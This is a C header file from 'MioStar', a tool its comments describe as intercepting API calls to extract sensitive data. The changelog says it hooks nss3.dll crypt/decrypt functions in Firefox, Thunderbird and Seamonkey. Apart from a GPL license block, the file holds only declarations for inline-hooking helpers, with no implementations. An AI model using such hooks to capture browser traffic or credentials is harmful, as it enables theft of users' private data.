/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */





#ifndef _ENTRY_POINT_HOOKING_FUNCTIONS_H
#define _ENTRY_POINT_HOOKING_FUNCTIONS_H

#include <windows.h>

#define  SIZEOFJUMP		5
#define  ASMNOP			0x90


void InsertByte(DWORD Addr, unsigned char Byte);
void InsertDword(DWORD Addr, DWORD dWord);
void GenJmp(DWORD To, DWORD From);
int ForgeHook(DWORD pAddr, DWORD pAddrToJump, byte **Buffer, char *pFunctionName);
#endif